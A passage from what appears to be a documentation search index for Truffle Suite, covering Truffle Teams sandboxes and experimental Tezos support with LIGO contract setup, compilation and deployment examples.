CONFIRM to save the new name. The sandbox details modal.","title":"Renaming a sandbox"},{"location":"docs/teams/sandboxes/sandbox-forking.html","text":"Sandbox forking \u00b6 Forking allows a sandbox to act as a live network from a given block number. We take for granted in web2 that we can get test credentials and interact with an API that will map to our production environment, but in web3 this hasn\u2019t been so easy. With a forked sandbox you can transact, deploy, test, and debug against Mainnet without spending real Ether! To fork a network, create a new sandbox by clicking the NEW SANDBOX button. Then, check the Enable forking checkbox. From there, select a network and optionally provide a block number. Clicking the CONFIRM button will spin up a new Ganache instance forked from the given network and block. Sandbox forking options and details.","title":"Teams | Sandbox forking"},{"location":"docs/teams/sandboxes/sandbox-forking.html#sandbox-forking","text":"Forking allows a sandbox to act as a live network from a given block number. We take for granted in web2 that we can get test credentials and interact with an API that will map to our production environment, but in web3 this hasn\u2019t been so easy. With a forked sandbox you can transact, deploy, test, and debug against Mainnet without spending real Ether! To fork a network, create a new sandbox by clicking the NEW SANDBOX button. Then, check the Enable forking checkbox. From there, select a network and optionally provide a block number. Clicking the CONFIRM button will spin up a new Ganache instance forked from the given network and block. Sandbox forking options and details.","title":"Sandbox forking"},{"location":"docs/teams/sandboxes/sandboxes-overview.html","text":"Sandboxes overview \u00b6 Sandboxes are shared Ganache instances you can create with the click of a button. Convenient features of Ganache's local development experience are now available to the whole team! Each sandbox has 10 pre-funded accounts and near-instant transaction times giving your team a performant, turnkey blockchain environment without spending a single wei on transactions.","title":"Teams | Sandboxes overview"},{"location":"docs/teams/sandboxes/sandboxes-overview.html#sandboxes-overview","text":"Sandboxes are shared Ganache instances you can create with the click of a button. Convenient features of Ganache's local development experience are now available to the whole team! Each sandbox has 10 pre-funded accounts and near-instant transaction times giving your team a performant, turnkey blockchain environment without spending a single wei on transactions.","title":"Sandboxes overview"},{"location":"docs/teams/sandboxes/usage-with-truffle.html","text":"Usage with Truffle \u00b6 You can use sandboxes with all of Truffle's commands that work with Ganache, including: migrate , console , and test ! With Truffle versions v5.1.28 and later, using a sandbox only requires the url field: module . exports = { networks : { teams : { url : \"https://sandbox.truffleteams.com/ac98e539-140d-498e-818e-8284eee9d933\" , network_id : 1583853263114 , }, }, }; If you're using an older version of Truffle, you'll need to use HDWalletProvider. In addition to providing the mnemonic and network_id , we must specify the initial account index ( 0 ), total number of accounts ( 10 ), and set the shareNonce option to false . Here's a complete example: const HDWalletProvider = require ( \"@truffle/hdwallet-provider\" ); const teamsMnemonic = \"custom buzz situate mesh cannon number grass improve iron swim pilot cool\" ; module . exports = { networks : { teams : { provider : function () { return new HDWalletProvider ( teamsMnemonic , \"https://sandbox.truffleteams.com/ac98e539-140d-498e-818e-8284eee9d933\" , 0 , 10 , false ); }, network_id : 1583853263114 , }, }, };","title":"Teams | Usage with Truffle"},{"location":"docs/teams/sandboxes/usage-with-truffle.html#usage-with-truffle","text":"You can use sandboxes with all of Truffle's commands that work with Ganache, including: migrate , console , and test ! With Truffle versions v5.1.28 and later, using a sandbox only requires the url field: module . exports = { networks : { teams : { url : \"https://sandbox.truffleteams.com/ac98e539-140d-498e-818e-8284eee9d933\" , network_id : 1583853263114 , }, }, }; If you're using an older version of Truffle, you'll need to use HDWalletProvider. In addition to providing the mnemonic and network_id , we must specify the initial account index ( 0 ), total number of accounts ( 10 ), and set the shareNonce option to false . Here's a complete example: const HDWalletProvider = require ( \"@truffle/hdwallet-provider\" ); const teamsMnemonic = \"custom buzz situate mesh cannon number grass improve iron swim pilot cool\" ; module . exports = { networks : { teams : { provider : function () { return new HDWalletProvider ( teamsMnemonic , \"https://sandbox.truffleteams.com/ac98e539-140d-498e-818e-8284eee9d933\" , 0 , 10 , false ); }, network_id : 1583853263114 , }, }, };","title":"Usage with Truffle"},{"location":"docs/teams/support/ask-us-a-question.html","text":"Ask us a question \u00b6 Open a Support Ticket! NEW The easiest way to track your conversation and contribute to our knowledge base! Open a support ticket to begin talking to our support staff. Common questions will be added to our knowledge base to assist future Trufflers! Open a Support Ticket Spectrum \u00b6 Couldn't find what you were looking for and still have questions? Please reach out to us! We're active on our Truffle Teams community Spectrum channel. GitHub \u00b6 We also have a GitHub repository for Truffle Teams where you can create an issue or request a feature. SIGN UP FOR THE TRUFFLE MAILING LIST Sign up today to be a member of the Truffle mailing list. You'll be added to our low volume mailing list which we'll use to communicate future changes, development ideas and allow you to shape Truffle's development. hbspt.forms.create({ portalId: \"4795067\", formId: \"d18995c8-32bb-4b2d-bde9-3f49fb3d2837\" });","title":"Teams | Ask us a question"},{"location":"docs/teams/support/ask-us-a-question.html#ask-us-a-question","text":"","title":"Ask us a question"},{"location":"docs/teams/support/ask-us-a-question.html#spectrum","text":"Couldn't find what you were looking for and still have questions? Please reach out to us! We're active on our Truffle Teams community Spectrum channel.","title":"Spectrum"},{"location":"docs/teams/support/ask-us-a-question.html#github","text":"We also have a GitHub repository for Truffle Teams where you can create an issue or request a feature.","title":"GitHub"},{"location":"docs/tezos/truffle/quickstart.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Tezos Quickstart \u00b6 Wanna build apps on Tezos using Truffle? You're in the right place. Table of Contents \u00b6 Getting set up Installing Truffle Using the Tezos Truffle Box Writing Contracts Deploying Contracts Testing Contracts Further Resources Getting Set Up \u00b6 Installing Docker \u00b6 Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience. Other Requirements \u00b6 NodeJS v8.9.4 or later Windows, Linux or Mac OS X Installing Truffle \u00b6 You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command. Using the Tezos Truffle Box \u00b6 This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir tezos-example $ cd tezos-example $ truffle unbox tezos-example Writing Contracts \u00b6 The example box comes with two contracts, which you can find in the ./contracts folder: Counter.ligo Migrations.ligo SimpleStorage.ligo You can see that these contracts end in the .ligo file extension. This refers to the LIGO programming language . See the Writing Tezos contracts section for more info. Deploying Contracts \u00b6 For this quick start, we're going to configure your project to deploy to the Delphinet or any other existing test network for Tezos. This is the quickest way to get started, though as you get familiar with Tezos, you'll want to set up a local development environment. See the example box documentation for an example on using a local flextesa sandbox. Configuring Truffle to point to the Tezos testnet \u00b6 First, navigate to https://faucet.tzalpha.net/ to get a faucet account. This will create a new account for you on the testnet and fill it with some testnet XTZ. This account is valid for all Tezos test networks. Download the file and save it as faucet.json in the root of your project. Next, replace the box's truffle-config.js with the following: const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <http://truffleframework.com/docs/advanced/configuration> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; That's it! You're all set to run the box's deployment scripts against a testnet. Note: The default tezos box is configured to deploy to multiple networks, including mainnet. If you'd like to deploy to those networks, you'll need to first configure the `secret`, `mnemonic`, `password`, and `email` like the above to represent an account you own that's funded with XTZ. See the Configuring Tezos Projects section for more info. Caution! Keep your `secret`, `mnemonic` and `password` safe! When not on a testnet, you can quickly lose all your tez if someone else gets ahold of them. Running Truffle's deployment scripts \u00b6 The example box comes default with pre-written deployment scripts, found within the ./migrations directory: 1_initial_migration.js 2_deploy_simple_storage.js 3_deploy_counter.js Truffle will handle running these scripts when you run the following command: $ truffle migrate See the Deploying Tezos contracts section for more information on how to write and use Truffle's deployment scripts. Testing Contracts \u00b6 The box also comes equipped with tests, showing you how to write automated tests for your Tezos contracts. You can find these tests in the ./test directory: counter.test.js simpleStorage.test.js See the Testing Tezos contracts section for more information on how to write tests for your LIGO congrats. Running your tests is easy, by running following command: $ truffle test Further Resources \u00b6 If you've reached this point, you now have a Truffle project that lets you compile, test, and deploy LIGO contracts to the Tezos test network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Tezos, LIGO, and Truffle: LIGO language documentation Tezos documentation Taquito communcation library Main Truffle Suite documentation","title":"Tezos Quickstart"},{"location":"docs/tezos/truffle/quickstart.html#tezos-quickstart","text":"Wanna build apps on Tezos using Truffle? You're in the right place.","title":"Tezos Quickstart"},{"location":"docs/tezos/truffle/quickstart.html#table-of-contents","text":"Getting set up Installing Truffle Using the Tezos Truffle Box Writing Contracts Deploying Contracts Testing Contracts Further Resources","title":"Table of Contents"},{"location":"docs/tezos/truffle/quickstart.html#getting-set-up","text":"","title":"Getting Set Up"},{"location":"docs/tezos/truffle/quickstart.html#installing-docker","text":"Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience.","title":"Installing Docker"},{"location":"docs/tezos/truffle/quickstart.html#other-requirements","text":"NodeJS v8.9.4 or later Windows, Linux or Mac OS X","title":"Other Requirements"},{"location":"docs/tezos/truffle/quickstart.html#installing-truffle","text":"You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command.","title":"Installing Truffle"},{"location":"docs/tezos/truffle/quickstart.html#using-the-tezos-truffle-box","text":"This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir tezos-example $ cd tezos-example $ truffle unbox tezos-example","title":"Using the Tezos Truffle Box"},{"location":"docs/tezos/truffle/quickstart.html#writing-contracts","text":"The example box comes with two contracts, which you can find in the ./contracts folder: Counter.ligo Migrations.ligo SimpleStorage.ligo You can see that these contracts end in the .ligo file extension. This refers to the LIGO programming language . See the Writing Tezos contracts section for more info.","title":"Writing Contracts"},{"location":"docs/tezos/truffle/quickstart.html#deploying-contracts","text":"For this quick start, we're going to configure your project to deploy to the Delphinet or any other existing test network for Tezos. This is the quickest way to get started, though as you get familiar with Tezos, you'll want to set up a local development environment. See the example box documentation for an example on using a local flextesa sandbox.","title":"Deploying Contracts"},{"location":"docs/tezos/truffle/quickstart.html#configuring-truffle-to-point-to-the-tezos-testnet","text":"First, navigate to https://faucet.tzalpha.net/ to get a faucet account. This will create a new account for you on the testnet and fill it with some testnet XTZ. This account is valid for all Tezos test networks. Download the file and save it as faucet.json in the root of your project. Next, replace the box's truffle-config.js with the following: const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <http://truffleframework.com/docs/advanced/configuration> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; That's it! You're all set to run the box's deployment scripts against a testnet. Note: The default tezos box is configured to deploy to multiple networks, including mainnet. If you'd like to deploy to those networks, you'll need to first configure the `secret`, `mnemonic`, `password`, and `email` like the above to represent an account you own that's funded with XTZ. See the Configuring Tezos Projects section for more info. Caution! Keep your `secret`, `mnemonic` and `password` safe! When not on a testnet, you can quickly lose all your tez if someone else gets ahold of them.","title":"Configuring Truffle to point to the Tezos testnet"},{"location":"docs/tezos/truffle/quickstart.html#running-truffles-deployment-scripts","text":"The example box comes default with pre-written deployment scripts, found within the ./migrations directory: 1_initial_migration.js 2_deploy_simple_storage.js 3_deploy_counter.js Truffle will handle running these scripts when you run the following command: $ truffle migrate See the Deploying Tezos contracts section for more information on how to write and use Truffle's deployment scripts.","title":"Running Truffle's deployment scripts"},{"location":"docs/tezos/truffle/quickstart.html#testing-contracts","text":"The box also comes equipped with tests, showing you how to write automated tests for your Tezos contracts. You can find these tests in the ./test directory: counter.test.js simpleStorage.test.js See the Testing Tezos contracts section for more information on how to write tests for your LIGO congrats. Running your tests is easy, by running following command: $ truffle test","title":"Testing Contracts"},{"location":"docs/tezos/truffle/quickstart.html#further-resources","text":"If you've reached this point, you now have a Truffle project that lets you compile, test, and deploy LIGO contracts to the Tezos test network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Tezos, LIGO, and Truffle: LIGO language documentation Tezos documentation Taquito communcation library Main Truffle Suite documentation","title":"Further Resources"},{"location":"docs/tezos/truffle/getting-started/compiling-tezos-contracts.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Compiling LIGO contracts \u00b6 Location \u00b6 All of your contracts are located in your project's contracts/ directory. Tezos contracts are written in LIGO , and all files containing contracts will have a file extension of .ligo . With the example Truffle Tezos project (created through truffle unbox tezos-example ), you're given three contracts, Counter.ligo , Migrations.ligo , and SimpleStorage.ligo . Command \u00b6 To compile a Tezos Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option. Build artifacts \u00b6 Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment. All good? \u00b6 If you've gotten this far, it's time to deploy. Check out our Deploying Tezos Contracts section for more!","title":"Truffle | Compiling LIGO contracts | Tezos"},{"location":"docs/tezos/truffle/getting-started/compiling-tezos-contracts.html#compiling-ligo-contracts","text":"","title":"Compiling LIGO contracts"},{"location":"docs/tezos/truffle/getting-started/compiling-tezos-contracts.html#location","text":"All of your contracts are located in your project's contracts/ directory. Tezos contracts are written in LIGO , and all files containing contracts will have a file extension of .ligo . With the example Truffle Tezos project (created through truffle unbox tezos-example ), you're given three contracts, Counter.ligo , Migrations.ligo , and SimpleStorage.ligo .","title":"Location"},{"location":"docs/tezos/truffle/getting-started/compiling-tezos-contracts.html#command","text":"To compile a Tezos Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option.","title":"Command"},{"location":"docs/tezos/truffle/getting-started/compiling-tezos-contracts.html#build-artifacts","text":"Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment.","title":"Build artifacts"},{"location":"docs/tezos/truffle/getting-started/compiling-tezos-contracts.html#all-good","text":"If you've gotten this far, it's time to deploy. Check out our Deploying Tezos Contracts section for more!","title":"All good?"},{"location":"docs/tezos/truffle/getting-started/creating-a-tezos-project.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Creating a Tezos Project \u00b6 To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project with Tezos. The best way to create a project with Tezos is to start with the tezos-example Truffle Box . Truffle boxes are example applications and project templates, and we've built one specifically for Tezos. Create a new directory for your Truffle project: mkdir tezos-example cd tezos-example Download (\"unbox\") the tezos-example box: truffle unbox tezos-example Note : You can use the `truffle unbox ` command to download any of the other Truffle Boxes , though note that as of this writing, few exist for Tezos. Note : To create a bare Truffle project with no smart contracts included, use `truffle init`. Note : You can use an optional `--force` to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for LIGO contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file , configured specifically for Tezos Ready to write some contracts? \u00b6 See the Writing LIGO Contracts section to get building!","title":"Truffle | Creating a Tezos Project | Tezos"},{"location":"docs/tezos/truffle/getting-started/creating-a-tezos-project.html#creating-a-tezos-project","text":"To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project with Tezos. The best way to create a project with Tezos is to start with the tezos-example Truffle Box . Truffle boxes are example applications and project templates, and we've built one specifically for Tezos. Create a new directory for your Truffle project: mkdir tezos-example cd tezos-example Download (\"unbox\") the tezos-example box: truffle unbox tezos-example Note : You can use the `truffle unbox ` command to download any of the other Truffle Boxes , though note that as of this writing, few exist for Tezos. Note : To create a bare Truffle project with no smart contracts included, use `truffle init`. Note : You can use an optional `--force` to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for LIGO contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file , configured specifically for Tezos","title":"Creating a Tezos Project"},{"location":"docs/tezos/truffle/getting-started/creating-a-tezos-project.html#ready-to-write-some-contracts","text":"See the Writing LIGO Contracts section to get building!","title":"Ready to write some contracts?"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Deploying Tezos Contracts \u00b6 If you're familiar with Truffle, then you already know about Truffle's deployment framework , called Migrations, used to manage deployment changes over time. Overview \u00b6 To deploy Tezos contracts, you'll first need to write migration scripts to tell Truffle how to deploy those contracts. For the rest of this document, we'll be referring to deployment scripts as \"migrations\" to keep in line with Truffle's normal lingo. Keep in mind that a \"migration\" is synonymous with \"deployment script\". Migrations \u00b6 Migrations are JavaScript files that help you deploy contracts to a Tezos network. These files are responsible for staging and running your deployment tasks, and they're written under the assumption that your deployment needs will change over time (e.g., you'll add new scripts as time progresses, and your product matures). Command \u00b6 To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts. Migration files \u00b6 A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = ( deployer ) => { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required to tell Truffle which order to run the scripts. The suffix is purely for human readability and comprehension. artifacts.require() \u00b6 At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the naem of the source file, without the .ligo extension. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/SimpleStorage.ligo function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) To interact with this contract, in your deployment script, you'd use artifacts.require() like so: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module.exports \u00b6 All migrations must export a function via the module.exports syntax. The function exported of each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below. Handling default values \u00b6 A full migration script using SimpleStorage would look like the example below. Note that a default value ( 3 ) is passed to the deployer's deploy() function in order to set the contract's initial state. Note that the type of this second parameter must represent the type of state held in the contract, and should be represented in a form that is convertable from Javascript. More details on this below. Coming from Ethereum? You'll notice that LIGO contracts lack constructors. Passing in default values as part of deployment is the only way to set the initial state of a contract. Constructors may be added to LIGO at a later date. Filename: ./migrations/2_deploy_simple_storage.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = ( deployer ) => { deployer . deploy ( SimpleStorage , 3 ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps. Deployer \u00b6 Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page. Network considerations \u00b6 It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"delphinet\" ) { // Do something specific to the network named \"delphinet\". } else { // Perform a different step otherwise. } } Available accounts \u00b6 Migrations are also passed the list of accounts set up in your wallet, for you to use during your deployments. module . exports = function ( deployer , network , accounts ) { console . log ( accounts ); // => [ 'tz1iGB5P9bZkt356S2PYgAEUWCAuYEvwu152' ] // Example contract that takes in an owner as its default state. // In this case we use the same account we're using to deploy. deployer . deploy ( OwnedContract , accounts [ 0 ]); } Deployer API \u00b6 The deployer contains many functions available to simplify your migrations. deployer.deploy(contract [, initialState] [, options]) \u00b6 Deploy a specific contract, specified by the contract object. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. This function takes an optional initial state as its second argument, that sets the state of your contract on chain when deployed. The type of data passed in this argument should match the type data stored in the state represented by the contract. We use the Taquito library to perform the translation from Javascript representation to types understood by Tezos. Please see their documentation for more information. The last argument is an optional object that can include the key named overwrite . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without any initial state. deployer . deploy ( A ); // Deploy a single contract with an initial state of 3. deployer . deploy ( A , 3 ); // Don't deploy this contract if it has already been deployed. deployer . deploy ( A , { overwrite : false }); // More specific example: // // Don't redeploy if the contract object represents an already-deployed dependency. // If it has already been deployed to our target network, we can skip deploying it. // This is useful for cases where we _do_ want to deploy that dependency for testing // and development networks, but we don't want to replace it in production. deployer . deploy ( SomeDependency , { overwrite : false }); deployer.then(function() {...}) \u00b6 Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A programatically, with 3 as the initial state. return A . new ( 3 ); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Send a transaction with the new instance of A's address using B's main() function. return b . main ( a . address ); });","title":"Truffle | Deploying Tezos Contracts"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#deploying-tezos-contracts","text":"If you're familiar with Truffle, then you already know about Truffle's deployment framework , called Migrations, used to manage deployment changes over time.","title":"Deploying Tezos Contracts"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#overview","text":"To deploy Tezos contracts, you'll first need to write migration scripts to tell Truffle how to deploy those contracts. For the rest of this document, we'll be referring to deployment scripts as \"migrations\" to keep in line with Truffle's normal lingo. Keep in mind that a \"migration\" is synonymous with \"deployment script\".","title":"Overview"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#migrations","text":"Migrations are JavaScript files that help you deploy contracts to a Tezos network. These files are responsible for staging and running your deployment tasks, and they're written under the assumption that your deployment needs will change over time (e.g., you'll add new scripts as time progresses, and your product matures).","title":"Migrations"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#command","text":"To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts.","title":"Command"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#migration-files","text":"A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = ( deployer ) => { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required to tell Truffle which order to run the scripts. The suffix is purely for human readability and comprehension.","title":"Migration files"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#artifactsrequire","text":"At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the naem of the source file, without the .ligo extension. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/SimpleStorage.ligo function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) To interact with this contract, in your deployment script, you'd use artifacts.require() like so: var SimpleStorage = artifacts . require ( \"SimpleStorage\" );","title":"artifacts.require()"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#moduleexports","text":"All migrations must export a function via the module.exports syntax. The function exported of each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below.","title":"module.exports"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#handling-default-values","text":"A full migration script using SimpleStorage would look like the example below. Note that a default value ( 3 ) is passed to the deployer's deploy() function in order to set the contract's initial state. Note that the type of this second parameter must represent the type of state held in the contract, and should be represented in a form that is convertable from Javascript. More details on this below. Coming from Ethereum? You'll notice that LIGO contracts lack constructors. Passing in default values as part of deployment is the only way to set the initial state of a contract. Constructors may be added to LIGO at a later date. Filename: ./migrations/2_deploy_simple_storage.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = ( deployer ) => { deployer . deploy ( SimpleStorage , 3 ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps.","title":"Handling default values"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#deployer","text":"Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page.","title":"Deployer"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#network-considerations","text":"It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"delphinet\" ) { // Do something specific to the network named \"delphinet\". } else { // Perform a different step otherwise. } }","title":"Network considerations"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#available-accounts","text":"Migrations are also passed the list of accounts set up in your wallet, for you to use during your deployments. module . exports = function ( deployer , network , accounts ) { console . log ( accounts ); // => [ 'tz1iGB5P9bZkt356S2PYgAEUWCAuYEvwu152' ] // Example contract that takes in an owner as its default state. // In this case we use the same account we're using to deploy. deployer . deploy ( OwnedContract , accounts [ 0 ]); }","title":"Available accounts"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#deployer-api","text":"The deployer contains many functions available to simplify your migrations.","title":"Deployer API"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#deployerdeploycontract-initialstate-options","text":"Deploy a specific contract, specified by the contract object. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. This function takes an optional initial state as its second argument, that sets the state of your contract on chain when deployed. The type of data passed in this argument should match the type data stored in the state represented by the contract. We use the Taquito library to perform the translation from Javascript representation to types understood by Tezos. Please see their documentation for more information. The last argument is an optional object that can include the key named overwrite . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without any initial state. deployer . deploy ( A ); // Deploy a single contract with an initial state of 3. deployer . deploy ( A , 3 ); // Don't deploy this contract if it has already been deployed. deployer . deploy ( A , { overwrite : false }); // More specific example: // // Don't redeploy if the contract object represents an already-deployed dependency. // If it has already been deployed to our target network, we can skip deploying it. // This is useful for cases where we _do_ want to deploy that dependency for testing // and development networks, but we don't want to replace it in production. deployer . deploy ( SomeDependency , { overwrite : false });","title":"deployer.deploy(contract [, initialState] [, options])"},{"location":"docs/tezos/truffle/getting-started/deploying-tezos-contracts.html#deployerthenfunction","text":"Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A programatically, with 3 as the initial state. return A . new ( 3 ); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Send a transaction with the new instance of A's address using B's main() function. return b . main ( a . address ); });","title":"deployer.then(function() {...})"},{"location":"docs/tezos/truffle/getting-started/installing-truffle-with-tezos.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Installing Truffle with Tezos \u00b6 Installing Docker \u00b6 Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience. Other Requirements \u00b6 NodeJS v8.9.4 or later Windows, Linux or Mac OS X Installing Truffle \u00b6 You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command. Next step: Create a Truffle project with Tezos \u00b6 Once you have Truffle and Docker installed, you can move on to creating a Tezos project with Truffle.","title":"Truffle | Installation | Tezos"},{"location":"docs/tezos/truffle/getting-started/installing-truffle-with-tezos.html#installing-truffle-with-tezos","text":"","title":"Installing Truffle with 